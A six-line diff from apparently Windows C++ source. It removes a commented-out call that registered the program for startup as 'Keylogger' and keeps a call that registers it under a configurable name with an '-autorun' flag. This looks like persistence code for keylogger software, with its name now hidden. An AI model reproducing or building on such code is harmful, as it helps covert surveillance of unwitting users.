@@ -107,7 +107,6 @@ void utility::RegisterProgram()
 	wchar_t szPathToExe[MAX_PATH];
 
 	GetModuleFileNameW(NULL, szPathToExe, MAX_PATH);
-	//RegisterMyProgramForStartup(L"Keylogger", szPathToExe, L"-autorun");
 	RegisterMyProgramForStartup(configuration::application_name.c_str(), szPathToExe, L"-autorun");
 }
 
